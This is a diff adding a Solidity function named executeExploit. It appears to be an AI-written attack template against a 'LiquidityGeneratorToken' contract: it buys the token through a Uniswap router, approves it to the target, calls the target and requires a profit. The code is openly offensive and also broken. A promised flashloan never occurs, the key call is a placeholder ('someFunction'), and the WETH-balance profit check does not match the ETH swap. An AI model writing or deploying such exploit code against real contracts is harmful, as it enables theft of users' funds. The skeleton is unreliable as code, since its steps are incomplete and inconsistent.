@@ -1,0 +1,31 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Step 1: Start the flashloan with valuableToken
+    require(amount > 0, "Invalid amount");
+    
+    // Step 2: Check token balances before flashloan
+    uint256 initialWETHBalance = IERC20(uniswapRouter.WETH()).balanceOf(address(this));
+    
+    // Step 3: Swap WETH for the target token
+    address[] memory path = new address[](2);
+    path[0] = uniswapRouter.WETH();
+    path[1] = token; // LiquidyGeneratorToken
+
+    uniswapRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(0, path, address(this), block.timestamp);
+    
+    // Step 4: Approve the token for transfer
+    uint256 tokenBalance = IERC20(token).balanceOf(address(this));
+    IERC20(token).approve(target, tokenBalance);
+
+    // Step 5: Interact with LiquidityGeneratorToken contract
+    // For example, execute a function that provides a way to claim rewards, or create liquidity
+    // Assuming the contract allows converting tokens to ETH as a step of the exploit
+    ILiquidityGeneratorToken(target).someFunction(tokenBalance); // Replace with actual function
+
+    // Step 6: Check token balance again
+    uint256 finalWETHBalance = IERC20(uniswapRouter.WETH()).balanceOf(address(this));
+    require(finalWETHBalance > initialWETHBalance, "No profit made");
+}
+</executeExploitCode>
+```
